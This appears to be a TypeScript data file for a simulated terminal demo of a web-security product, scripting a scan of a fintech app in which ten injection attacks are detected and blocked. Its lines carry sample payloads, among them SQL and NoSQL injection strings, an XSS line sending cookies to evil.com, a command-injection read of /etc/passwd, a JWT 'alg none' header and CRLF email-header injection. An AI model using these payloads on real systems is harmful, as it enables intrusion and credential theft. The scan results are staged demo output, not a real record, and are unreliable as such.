export interface InjectionLine {
  t: 'prompt' | 'success' | 'warn' | 'info' | 'dim' | 'blocked';
  text: string;
}

export interface InjectionStat {
  type: string;
  label: string;
  count: number;
  color: string;
  icon: string;
}

export const injectionTypes: InjectionStat[] = [
  { type: 'sqli', label: 'SQL Injection', count: 0, color: 'red', icon: 'database' },
  { type: 'nosqli', label: 'NoSQL Injection', count: 0, color: 'orange', icon: 'server' },
  { type: 'cmdi', label: 'Command Injection', count: 0, color: 'amber', icon: 'terminal' },
  { type: 'xss', label: 'Cross-Site Scripting', count: 0, color: 'yellow', icon: 'code' },
  { type: 'ldapi', label: 'LDAP Injection', count: 0, color: 'blue', icon: 'shield' },
  { type: 'emaili', label: 'Email Header Injection', count: 0, color: 'violet', icon: 'mail' },
  { type: 'tmpli', label: 'Template Injection', count: 0, color: 'pink', icon: 'file' },
  { type: 'xxe', label: 'XXE Injection', count: 0, color: 'cyan', icon: 'globe' },
];

export const injectionTerminalLines: InjectionLine[] = [
  { t: 'prompt', text: '$ drocol inject --guard --target lagos-fintech-app.ng --mode live' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[init] InjectionPrompt Engine v3.7.0 · Node: lagos-01.drocol.ng' },
  { t: 'info', text: '[init] Loading 1,247 injection signatures across 8 vectors...' },
  { t: 'success', text: '[ok] Signatures loaded · WAF active · Runtime protection engaged' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[scan] Scanning target: lagos-fintech-app.ng (47 endpoints, 336 API routes)' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[1/10] Testing /api/v1/users/search for SQL injection...' },
  { t: 'warn', text: '  ⚠ SQL Injection detected on /api/v1/users/search' },
  { t: 'dim', text: '  ├─ Payload: \' OR 1=1 --' },
  { t: 'dim', text: '  ├─ Source: 185.220.101.45 (TOR exit node)' },
  { t: 'dim', text: '  └─ Risk: Unauthorized access to all user records' },
  { t: 'blocked', text: '  ✓ BLOCKED — WAF rule SQLI-001 triggered, IP blacklisted' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[2/10] Testing /api/v1/products for NoSQL injection...' },
  { t: 'warn', text: '  ⚠ NoSQL Injection detected on /api/v1/products' },
  { t: 'dim', text: '  ├─ Payload: {"$gt": ""}' },
  { t: 'dim', text: '  ├─ Source: 45.33.32.156 (Linode, US)' },
  { t: 'dim', text: '  └─ Risk: Authentication bypass, data exfiltration' },
  { t: 'blocked', text: '  ✓ BLOCKED — Malicious operators stripped, rate limited' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[3/10] Testing /search for cross-site scripting...' },
  { t: 'warn', text: '  ⚠ Reflected XSS detected on /search' },
  { t: 'dim', text: '  ├─ Payload: <script>document.location="https://evil.com/?c="+document.cookie</script>' },
  { t: 'dim', text: '  ├─ Source: 91.121.87.34 (OVH, France)' },
  { t: 'dim', text: '  └─ Risk: Session hijacking, credential theft' },
  { t: 'blocked', text: '  ✓ BLOCKED — Script sanitized, CSP header enforced' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[4/10] Testing /api/v1/export for command injection...' },
  { t: 'warn', text: '  ⚠ Command Injection detected on /api/v1/export' },
  { t: 'dim', text: '  ├─ Payload: ; cat /etc/passwd' },
  { t: 'dim', text: '  ├─ Source: 103.235.46.93 (DigitalOcean, SG)' },
  { t: 'dim', text: '  └─ Risk: Remote code execution on server' },
  { t: 'blocked', text: '  ✓ BLOCKED — Shell metacharacters filtered' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[5/10] Testing /graphql for injection...' },
  { t: 'warn', text: '  ⚠ GraphQL Injection detected on /graphql' },
  { t: 'dim', text: '  ├─ Payload: {__schema{types{name,fields{name}}}}' },
  { t: 'dim', text: '  ├─ Source: 192.168.1.100 (Internal network)' },
  { t: 'dim', text: '  └─ Risk: Full schema exposure, data extraction' },
  { t: 'blocked', text: '  ✓ BLOCKED — Introspection disabled, depth limit enforced' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[6/10] Testing /api/v1/auth/verify for JWT injection...' },
  { t: 'warn', text: '  ⚠ JWT Injection detected on /api/v1/auth/verify' },
  { t: 'dim', text: '  ├─ Payload: {"alg":"none","typ":"JWT"}' },
  { t: 'dim', text: '  ├─ Source: 54.38.192.101 (Scaleway, PL)' },
  { t: 'dim', text: '  └─ Risk: Token forgery, account impersonation' },
  { t: 'blocked', text: '  ✓ BLOCKED — Algorithm whitelist enforced' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[7/10] Testing /api/v1/contact for email header injection...' },
  { t: 'warn', text: '  ⚠ Email Header Injection detected on /api/v1/contact' },
  { t: 'dim', text: '  ├─ Payload: %0d%0aCc:attacker@evil.com' },
  { t: 'dim', text: '  ├─ Source: 185.234.72.16 (Hetzner, DE)' },
  { t: 'dim', text: '  └─ Risk: Phishing emails from your domain' },
  { t: 'blocked', text: '  ✓ BLOCKED — CRLF characters stripped' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[8/10] Testing /api/v1/email/templates for SSTI...' },
  { t: 'warn', text: '  ⚠ Template Injection (SSTI) detected on /api/v1/email/templates' },
  { t: 'dim', text: '  ├─ Payload: {{7*7}}' },
  { t: 'dim', text: '  ├─ Source: 78.46.89.12 (Hetzner, FI)' },
  { t: 'dim', text: '  └─ Risk: Server-side code execution' },
  { t: 'blocked', text: '  ✓ BLOCKED — Template sandbox active' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[9/10] Testing S3 bucket prod-exports for policy injection...' },
  { t: 'warn', text: '  ⚠ S3 Policy Injection detected on prod-exports bucket' },
  { t: 'dim', text: '  ├─ Payload: {"Effect":"Allow","Principal":"*"}' },
  { t: 'dim', text: '  ├─ Source: AWS IAM user (compromised key)' },
  { t: 'dim', text: '  └─ Risk: Public data exposure' },
  { t: 'blocked', text: '  ✓ BLOCKED — Policy rejected, access key rotated' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[10/10] Testing Lambda environment for variable injection...' },
  { t: 'warn', text: '  ⚠ Lambda Environment Injection detected' },
  { t: 'dim', text: '  ├─ Payload: AWS_ACCESS_KEY_ID=AKIA...' },
  { t: 'dim', text: '  ├─ Source: 10.0.3.45 (Internal VPC)' },
  { t: 'dim', text: '  └─ Risk: Function hijacking, data breach' },
  { t: 'blocked', text: '  ✓ BLOCKED — Environment locked, overwrite prevented' },
  { t: 'dim', text: '' },
  { t: 'success', text: '[summary] Scan complete — 10 threats detected, 10 blocked (100%)' },
  { t: 'success', text: '  ├─ SQLi · NoSQLi · XSS · CMDi · GraphQL · JWT' },
  { t: 'success', text: '  ├─ Email · SSTI · S3 · Lambda' },
  { t: 'success', text: '  └─ 2 zero-day patterns submitted to CVE database' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[remediation] Auto-remediation complete:' },
  { t: 'success', text: '  ├─ WAF rules updated: SQLI-001 → SQLI-004' },
  { t: 'success', text: '  ├─ Jira: INJ-2041 → INJ-2050 created' },
  { t: 'success', text: '  ├─ Slack: #injection-alerts notified' },
  { t: 'success', text: '  └─ Dashboard: CBN/NDPR compliance updated' },
  { t: 'dim', text: '' },
  { t: 'info', text: '[restart] Rescanning in 5s...' },
];

export interface AttackSurface {
  id: string;
  label: string;
  icon: string;
  description: string;
  endpoints: number;
  threats: number;
  blocked: number;
}

export const attackSurfaces: AttackSurface[] = [
  { id: 'web', label: 'Web', icon: 'globe', description: 'Web application endpoints', endpoints: 47, threats: 0, blocked: 0 },
  { id: 'api', label: 'API', icon: 'server', description: 'REST & GraphQL APIs', endpoints: 336, threats: 0, blocked: 0 },
  { id: 'app', label: 'App', icon: 'smartphone', description: 'Mobile app SDKs', endpoints: 24, threats: 0, blocked: 0 },
  { id: 'email', label: 'Email', icon: 'mail', description: 'SMTP & email integrations', endpoints: 8, threats: 0, blocked: 0 },
  { id: 'cloud', label: 'Cloud', icon: 'cloud', description: 'Cloud infrastructure', endpoints: 16, threats: 0, blocked: 0 },
];